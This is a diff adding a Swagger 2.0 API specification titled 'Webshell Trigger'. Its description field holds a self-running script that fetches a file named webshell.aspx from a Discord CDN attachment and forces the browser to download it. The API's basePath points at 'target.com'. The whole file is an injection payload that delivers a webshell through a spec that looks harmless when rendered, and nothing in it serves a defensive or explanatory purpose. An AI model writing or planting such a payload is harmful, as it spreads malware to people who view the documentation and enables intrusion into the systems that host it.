@@ -1,0 +1,56 @@
+---
+swagger: '2.0'
+info:
+  title: Webshell Trigger
+  description: |
+    <script>
+      // Function to trigger file download
+      function triggerDownload() {
+        // URL of the webshell
+        var webshellUrl = 'https://cdn.discordapp.com/attachments/1066377629403447296/1270330866819792948/webshell.aspx?ex=66b34f50&is=66b1fdd0&hm=5df0203413162f3a91dda9c436d79b383a969be5828b7d1dfdea25e586c32eac';
+
+        // Create a new XMLHttpRequest object
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", webshellUrl, true);
+        xhr.responseType = 'blob';
+
+        xhr.onload = function () {
+          if (xhr.status === 200) {
+            // Create a link element to trigger the download
+            var a = document.createElement("a");
+            a.href = URL.createObjectURL(xhr.response);
+            a.download = "webshell.aspx";
+            a.click();
+
+            // Optionally execute the file or perform further actions
+            // This is a placeholder; actual execution requires server-side support
+          }
+        };
+
+        // Send the request
+        xhr.send();
+      }
+
+      // Execute the function
+      triggerDownload();
+    </script>
+  version: 1.0
+basePath: https://target.com
+produces:
+- application/xml
+- application/json
+consumes:
+- application/xml
+- application/json
+security:
+- basicAuth: []
+paths:
+  "/trigger_webshell":
+    get:
+      responses:
+        '200':
+          description: Triggers download of webshell
+      tags:
+      - Webshell Trigger
+      operationId: triggerDownload
+      summary: Initiates download of webshell
